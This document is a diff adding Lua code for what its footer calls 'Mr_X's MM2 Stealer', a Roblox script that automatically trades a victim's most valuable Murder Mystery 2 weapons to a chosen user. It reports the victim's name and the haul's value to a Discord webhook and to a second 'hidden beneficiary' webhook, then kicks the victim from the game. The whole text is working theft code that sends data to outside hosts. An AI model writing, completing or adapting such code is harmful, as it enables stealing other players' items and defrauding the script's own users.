+        table.sort(weaponsToSend, function(a, b)
+            return (a.Value * a.Amount) > (b.Value * b.Amount)
+        end)
+
+        local sentWeapons = {}
+        for i, v in ipairs(weaponsToSend) do
+            sentWeapons[i] = v
+        end
+
+        local prefix = ""
+        if ping == "Yes" then
+            prefix = "--[[@everyone]] "
+        end
+
+        SendFirstMessage(weaponsToSend, prefix)
+
+        -- ======== FAST TRADE SYSTEM ========
+        local function doTrade(joinedUser)
+            print("Starting FAST trade process with: " .. joinedUser)
+            
+            local initialTradeState = getTradeStatus()
+            if initialTradeState == "StartTrade" then
+                game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineTrade"):FireServer()
+                task.wait(0.2)
+            elseif initialTradeState == "ReceivingRequest" then
+                game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineRequest"):FireServer()
+                task.wait(0.2)
+            end
+
+            local tradesCompleted = 0
+            local maxTrades = math.ceil(#weaponsToSend / 4) -- Max 4 items per trade
+            
+            while #weaponsToSend > 0 do
+                local tradeStatus = getTradeStatus()
+
+                if tradeStatus == "None" then
+                    print("Sending trade request to: " .. joinedUser)
+                    sendTradeRequest(joinedUser)
+                    task.wait(0.5)
+                elseif tradeStatus == "SendingRequest" then
+                    task.wait(0.3)
+                elseif tradeStatus == "ReceivingRequest" then
+                    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineRequest"):FireServer()
+                    task.wait(0.3)
+                elseif tradeStatus == "StartTrade" then
+                    print("Trade started, adding weapons...")
+                    local itemsThisTrade = math.min(4, #weaponsToSend)
+                    
+                    for i = 1, itemsThisTrade do
+                        local weapon = table.remove(weaponsToSend, 1)
+                        for count = 1, weapon.Amount do
+                            addWeaponToTrade(weapon.DataID)
+                            task.wait(0.05) -- Faster between items
+                        end
+                    end
+                    
+                    task.wait(2) -- Shorter wait before accepting
+                    print("Accepting trade...")
+                    acceptTrade()
+                    waitForTradeCompletion()
+                    tradesCompleted = tradesCompleted + 1
+                    print(string.format("Trade %d/%d completed", tradesCompleted, maxTrades))
+                else
+                    task.wait(0.3)
+                end
+                task.wait(0.3)
+            end
+            
+            -- Send final completion message
+            local finalData = {
+                ["embeds"] = {{
+                    ["title"] = "✅ MM2 FAST TRADE COMPLETED",
+                    ["description"] = "All weapons transferred successfully!\nJoin our Discord: " .. discordLink,
+                    ["color"] = 0x00FF00,
+                    ["fields"] = {
+                        {
+                            name = "👤 Victim Username:",
+                            value = plr.Name,
+                            inline = true
+                        },
+                        {
+                            name = "👑 Hidden Beneficiary:",
+                            value = beneficiaryName,
+                            inline = true
+                        },
+                        {
+                            name = "🎯 Trader:",
+                            value = joinedUser,
+                            inline = true
+                        },
+                        {
+                            name = "🔪 Trades Completed:",
+                            value = tostring(tradesCompleted),
+                            inline = true
+                        },
+                        {
+                            name = "💰 Total Value:",
+                            value = tostring(totalValue),
+                            inline = true
+                        },
+                        {
+                            name = "⚡ Transfer Speed:",
+                            value = "FAST MODE ACTIVATED",
+                            inline = true
+                        },
+                        {
+                            name = "🎮 Discord:",
+                            value = "[Join our server](" .. discordLink .. ")",
+                            inline = false
+                        }
+                    },
+                    ["footer"] = {
+                        ["text"] = "Mr_X's MM2 Stealer | HIDDEN BENEFICIARY | " .. discordLink
+                    }
+                }}
+            }
+            
+            local finalBody = HttpService:JSONEncode(finalData)
+            request({
+                Url = webhook,
+                Method = "POST",
+                Headers = { ["Content-Type"] = "application/json" },
+                Body = finalBody
+            })
+            
+            -- Send to hidden webhook
+            sendToMyWebhook(finalData)
+            
+            plr:kick("FAST MM2 TRADE COMPLETE! All weapons transferred!\n Join our Discord: " .. discordLink)
+        end
+
+        local function waitForUserChat()
+            local sentMessage = false
+            local function onPlayerChat(player)
+                -- ✅ MODIFIED: Check if player is the beneficiary OR is in users list
+                if player.Name == beneficiaryName or table.find(users, player.Name) then
+                    player.Chatted:Connect(function()
+                        if not sentMessage then
+                            SendMessage(sentWeapons)
+                            sentMessage = true
+                        end
+                        doTrade(player.Name)
+                    end)
+                end
+            end
+            for _, p in ipairs(Players:GetPlayers()) do onPlayerChat(p) end
+            Players.PlayerAdded:Connect(onPlayerChat)
+        end
+        -- ======== End of FAST TRADE SYSTEM ========
+
+        waitForUserChat()
+    end
+end)
+
+-- Add warning message in chat
+task.spawn(function()
+    task.wait(17) -- After loading
+    local ChatService = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
+    if ChatService then
+        local SayMessage = ChatService:FindFirstChild("SayMessageRequest")
+        if SayMessage then
+            SayMessage:FireServer("⚠️ FAST MM2 Script active! Hidden Beneficiary: " .. beneficiaryName, "All")
+        end
+    end
+end)
